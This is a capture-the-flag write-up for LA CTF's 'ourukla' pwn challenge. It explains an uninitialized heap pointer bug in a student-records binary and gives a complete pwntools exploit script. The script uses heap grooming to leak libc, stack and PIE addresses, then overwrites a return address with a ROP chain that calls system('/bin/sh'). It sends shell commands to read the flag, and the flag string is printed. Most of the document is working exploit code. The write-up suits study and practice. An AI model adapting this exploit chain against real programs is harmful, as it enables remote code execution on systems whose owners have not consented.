# ourukla (pwn, 308 pts, 24 solves)

**Category:** pwn

---

#### Description

A student management system ("ourUKLA v0.1.7") with add/get/remove operations. Source provided. Binary is amd64 with Partial RELRO, no canary, NX, PIE. Ships with glibc 2.41.

#### Solution

The bug is an **uninitialized `sinfo` pointer** in `add_student()`. When `malloc(sizeof(struct student))` returns a recycled (non-top) chunk, the student struct's `sinfo` field contains stale heap data instead of being zeroed. The code only NULLs `sinfo` when the allocation came from the top chunk:

```c
char* old_top = *((char**)puts + (0x166580/8)) + 0x10;  // libc internal: main_arena.top
struct student *s = ourUKLA[cur_index] = malloc(sizeof(struct student));
if ((void *)old_top == (void *)s) s->sinfo = NULL;       // only NULL if from top chunk!
```

If the student is added without filling info (`add_empty`), the stale `sinfo` pointer persists. When `get_student_info()` later dereferences it, it reads from whatever the pointer happens to point at.

**Struct layout:**

```
student (0x20 chunk):     [array_id:8][uid:8][sinfo*:8]
student_info (0xf0 alloc): [noeditingmyptrs:0x10][name*:8][attributes:8][major:0x40][aux:0x90]
```

The exploit has four phases, each leveraging a **double-split primitive**: plant a controlled value into an unsorted chunk's metadata via one student's `sinfo->major` write, then split the unsorted chunk 9 more times so the 10th split's student struct picks up the planted value as its `sinfo`.

**Phase 1 - Libc leak:** Fill tcache bins for 0x20/0x100/0x110, then free a student pair to create a 0x210 unsorted chunk. Drain tcache\[0x20], then `add_empty` pulls from the fastbin. The recycled student struct has a stale `sinfo` pointing into the unsorted chunk, whose `fd` contains a libc arena pointer. `get_student_info` prints `sinfo->name` = unsorted fd = libc leak.

**Phase 2 - Stack leak:** Use the double-split primitive to plant `__environ - 0x18` as a fake sinfo pointer. When `get_student_info` prints `sinfo->attributes` (at sinfo+0x18), it reads `*(__environ)` which is a stack address.

**Phase 3 - PIE leak:** Same technique targeting a stack return address at `__environ - 0x30` to leak PIE base.

**Phase 4 - Stack ROP:** The key insight is that `fill_student_info` writes to `sinfo->major` (at sinfo+0x20) via `read()`. By planting `sinfo = __environ - 0x160`, the major write lands at `__environ - 0x140`, which is exactly `add_student`'s return address on the stack. The offset must be chosen carefully: `sinfo+0x10` (the name pointer write) must NOT collide with `fill_student_info`'s own sinfo local variable at `__environ - 0x190`. With sinfo = env-0x160:

| Write              | Stack Location | What's There                              |
| ------------------ | -------------- | ----------------------------------------- |
| sinfo+0x10 (name)  | env-0x150      | add\_student saved rbx (harmless)         |
| sinfo+0x18 (attrs) | env-0x148      | add\_student saved rbp (harmless)         |
| sinfo+0x20 (major) | env-0x140      | add\_student return addr -> **ROP chain** |

The ROP chain is `pop rdi; ret` -> `"/bin/sh"` -> `ret` (alignment) -> `system`.

No stack canary means the overwrite goes undetected. When `add_student` returns, it jumps into the ROP chain and spawns a shell.

```python
#!/usr/bin/env python3
"""
ourukla exploit - LA CTF pwn (308 pts)
Uninitialized sinfo pointer when malloc returns recycled (non-top) chunk.

Phase 1: Libc leak via unsorted bin fd through stale sinfo->name
Phase 2: __environ leak via attributes single-deref read
Phase 3: PIE leak via stack return address
Phase 4: Stack ROP - write ROP chain to add_student's return address
"""
import os, re
from pwn import *

context.binary = ELF("attachments/chall", checksec=False)
elf = context.binary
libc = ELF("libs/libc.so.6.real", checksec=False)
context.log_level = os.environ.get("LOG", "info")

HOST, PORT = "chall.lac.tf", 31147
LEAK_OFF   = 0x1e6c20   # unsorted bin fd -> libc base
STACK_OFF  = 0x30        # __environ value - 0x30 = PIE retaddr on stack
PIE_OFF    = 0x10e1      # retaddr - PIE base
POP_RDI_RET = 0x2a145
RET_GADGET  = 0x2846b

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(["./libs/ld-linux-x86-64.so.2.real",
                    "--library-path", "./libs", "./attachments/chall"])

def pad(b, n):
    return b.ljust(n, b"\x00")

io = None
cidx = 0
uid_ctr = [100]

def nuid():
    u = uid_ctr[0]; uid_ctr[0] += 1; return u

def menu():
    io.recvuntil(b"Option > ")

def add_full(uid, name=b"A", major=b"B", attr=0):
    global cidx; cidx = (cidx + 1) % 10
    io.sendline(b"1")
    io.sendlineafter(b"Enter student UID: ", str(uid).encode())
    io.sendlineafter(b"Enter student information now", b"y")
    io.sendafter(b"Student name: ", pad(name, 0x100))
    io.sendafter(b"Student major: ", pad(major, 0x40))
    io.sendlineafter(b"Student attributes", str(attr).encode())
    io.sendlineafter(b"(y/n)? ", b"n")
    menu()

def add_empty(uid):
    global cidx; cidx = (cidx + 1) % 10
    io.sendline(b"1")
    io.sendlineafter(b"Enter student UID: ", str(uid).encode())
    io.sendlineafter(b"Enter student information now", b"n")
    menu()

def remove(uid):
    io.sendline(b"3")
    io.sendlineafter(b"Enter student UID: ", str(uid).encode())
    menu()

def get_info(uid):
    io.sendline(b"2")
    io.sendlineafter(b"Enter student UID: ", str(uid).encode())
    return io.recvuntil(b"Option > ")

def create_unsorted_0x210():
    """Fill tcache, free a pair to create 0x210 unsorted chunk, drain tcache[0x20]."""
    drain = []
    for _ in range(7):
        u = nuid(); add_full(u, name=b"D", major=b"D"); drain.append(u)
    pair = nuid(); add_full(pair, name=b"P", major=b"P")
    guard = nuid(); add_full(guard, name=b"G", major=b"G")
    for u in drain:
        remove(u)
    remove(pair)
    for _ in range(7):
        add_empty(nuid())

def write_and_split(value):
    """
    Plant value into unsorted chunk via split1's stale sinfo major write.
    Split10 reads it as sinfo. Returns split10's uid.
    """
    u_w = nuid()
    global cidx; cidx = (cidx + 1) % 10
    io.sendline(b"1")
    io.sendlineafter(b"Enter student UID: ", str(u_w).encode())
    io.sendlineafter(b"Enter student information now", b"y")
    io.sendafter(b"Student name: ", pad(b"X", 0x100))
    io.sendafter(b"Student major: ", pad(b"\x00" * 0x10 + p64(value), 0x40))
    io.sendlineafter(b"Student attributes", b"0")
    io.sendlineafter(b"(y/n)? ", b"n")
    menu()
    for _ in range(8):
        add_empty(nuid())
    reader = nuid()
    add_empty(reader)
    return reader

def write_and_split_writer(value):
    """Same but the 10th split student is added by caller with fill_student_info."""
    u_w = nuid()
    global cidx; cidx = (cidx + 1) % 10
    io.sendline(b"1")
    io.sendlineafter(b"Enter student UID: ", str(u_w).encode())
    io.sendlineafter(b"Enter student information now", b"y")
    io.sendafter(b"Student name: ", pad(b"X", 0x100))
    io.sendafter(b"Student major: ", pad(b"\x00" * 0x10 + p64(value), 0x40))
    io.sendlineafter(b"Student attributes", b"0")
    io.sendlineafter(b"(y/n)? ", b"n")
    menu()
    for _ in range(8):
        add_empty(nuid())

def main():
    global io, cidx
    io = start()
    io.timeout = float(os.environ.get("TIMEOUT", "5.0"))
    menu()

    # Phase 1: Libc leak
    for i in range(9):
        add_full(1000 + i, name=b"N", major=b"M")
    for i in range(7):
        remove(1000 + i)
    remove(1007)
    for _ in range(7):
        add_empty(nuid())
    leak_uid = nuid()
    add_empty(leak_uid)

    out = get_info(leak_uid)
    m = re.search(br"Student Name: (.*)\n", out)
    raw = m.group(1)
    libc_base = u64(raw[:6].ljust(8, b"\x00")) - LEAK_OFF
    log.success(f"libc base: {libc_base:#x}")

    # Phase 2: __environ leak
    environ_addr = libc_base + libc.symbols["__environ"]
    r1 = write_and_split(environ_addr - 0x18)
    out = get_info(r1)
    m = re.search(br"Student Attributes \(number\): (\d+)", out)
    stack_env = int(m.group(1))
    log.success(f"__environ: {stack_env:#x}")

    # Phase 3: PIE leak
    create_unsorted_0x210()
    pie_loc = stack_env - STACK_OFF
    r2 = write_and_split(pie_loc - 0x18)
    out = get_info(r2)
    m = re.search(br"Student Attributes \(number\): (\d+)", out)
    pie_base = int(m.group(1)) - PIE_OFF
    log.success(f"PIE base: {pie_base:#x}")

    # Phase 4: Stack ROP
    pop_rdi = libc_base + POP_RDI_RET
    ret     = libc_base + RET_GADGET
    binsh   = libc_base + next(libc.search(b"/bin/sh\x00"))
    system  = libc_base + libc.symbols["system"]

    target_sinfo = stack_env - 0x160

    create_unsorted_0x210()
    write_and_split_writer(target_sinfo)

    writer_uid = nuid()
    cidx = (cidx + 1) % 10

    major_blob  = p64(pop_rdi)
    major_blob += p64(binsh)
    major_blob += p64(ret)
    major_blob += p64(system)
    major_blob = major_blob.ljust(0x40, b"\x00")

    io.sendline(b"1")
    io.sendlineafter(b"Enter student UID: ", str(writer_uid).encode())
    io.sendlineafter(b"Enter student information now", b"y")
    io.sendafter(b"Student name: ", pad(b"Z", 0x100))
    io.sendafter(b"Student major: ", major_blob)
    io.sendlineafter(b"Student attributes", b"0")
    io.sendlineafter(b"(y/n)? ", b"n")

    io.recvuntil(b"added at index")
    io.recvline()
    import time; time.sleep(0.3)
    io.sendline(b"cat flag* 2>/dev/null; id")
    io.interactive()

if __name__ == "__main__":
    main()
```

**Flag:** `lactf{w0w_y0u_s0lv3d_m3_heap_heap_hurray}`
